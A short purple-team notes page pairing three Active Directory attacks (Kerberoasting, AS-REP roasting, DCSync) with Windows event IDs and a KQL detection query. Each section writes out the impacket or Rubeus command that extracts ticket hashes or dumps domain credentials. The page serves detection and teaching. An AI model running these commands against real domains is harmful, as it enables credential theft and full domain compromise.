---
title: "Active Directory: attack → detect"
date: 2026-09-23
side: "purple"
summary: "Common AD attacks with the command and the log evidence a SOC should look for."
tags: ["active-directory", "detection", "kql"]
---
> For authorized labs and engagements only. Starter page: merge your Notion cheat sheet here.

## Kerberoasting

```bash
impacket-GetUserSPNs corp.local/user:'Password' -dc-ip 10.0.0.10 -request
Rubeus.exe kerberoast /outfile:hashes.txt
```

**Detect:** Event 4769 for service accounts with ticket encryption type `0x17` (RC4), especially many requests from one account in a short time.

```kql
SecurityEvent
| where EventID == 4769 and TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize SPNs = dcount(ServiceName) by Account, IpAddress, bin(TimeGenerated, 10m)
| where SPNs > 5
```

## AS-REP roasting

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -no-pass
```

**Detect:** Event 4768 with pre-authentication type `0` for accounts that have "Do not require Kerberos preauthentication" set.

## DCSync

```bash
impacket-secretsdump corp.local/admin@10.0.0.10 -just-dc
```

**Detect:** Event 4662 with the directory replication GUIDs (`1131f6aa-…`, `1131f6ad-…`) requested by an account that is not a domain controller.
